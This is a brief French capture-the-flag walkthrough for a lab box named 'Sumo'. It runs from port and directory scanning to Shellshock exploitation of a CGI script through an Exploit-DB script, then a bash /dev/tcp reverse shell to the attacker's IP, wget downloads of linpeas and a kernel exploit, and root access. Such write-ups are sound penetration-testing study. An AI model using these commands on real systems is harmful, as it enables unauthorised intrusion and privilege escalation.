# Sumo

    sudo nmap -p- -sV -T5 192.168.161.87
    sudo masscan -p1-65535,U:1-65535 --rate=1000 192.168.161.87 -e tun0
    sudo /home/timothe/.local/bin/autorecon 192.168.161.87
    gobuster dir -u http://192.168.161.87 -w  /usr/share/wordlists/seclists/Discovery/Web-Content/big.txt
Scans classiques.

Absolument rien d'exploitable sur le site à première vue : 

> /.htpasswd (Status: 403) [Size: 291]   
> /.htaccess (Status: 403) [Size: 291]   
> /cgi-bin/ (Status: 403) [Size: 290]   
> /index (Status: 200) [Size: 177]   
> /server-status (Status: 403) [Size: 295]

Mais en lançant un scan avec Nikto on voit que le site serait potentiellement exposé aux vulnérabilités de type Shellshock. Et c'est vrai que le fait de voir un dossier **/cgi-bin/** doit être un déclic pour tester la Shellshock, même si il est en 403.

    ffuf -w /usr/share/seclists/Discovery/Web-Content/CGIs.txt -u http://192.168.161.87/cgi-bin/FUZZ.sh -e .sh,.cgi -fc 403
Ce fuzzing fonctionne et nous sort des résultats positifs pour **"test"** et en effet l'URL http://192.168.161.87/cgi-bin/test amène sur une page indiquant **"CGI Default !"**

Pour l'exploitation, j'ai trouvé un bon script tout fait au lieu de m'embêter à passer par cURL : 
<br /> https://www.exploit-db.com/exploits/34900

    vim exploit_Shellshock.py
    python2.7 exploit_Shellshock.py payload=reverse rhost=192.168.161.87 lhost=192.168.45.171 lport=9999 pages=/cgi-bin/test
    /bin/bash -i >& /dev/tcp/192.168.45.171/1234 0>&1
    cat local.txt

Élévation de privilèges classique avec un CVE : 

    wget http://192.168.45.171/linpeas.sh
    chmod u+x ./linpeas.sh
    ./linpeas.sh | tee resultat.txt
    ...
    wget http://192.168.45.171/exploit_Linux_33589.c
    gcc exploit_Linux_33589.c -O2 -o ./33589.sh
    ./33589.sh 0
    ls /root
    cat /root/proof.txt
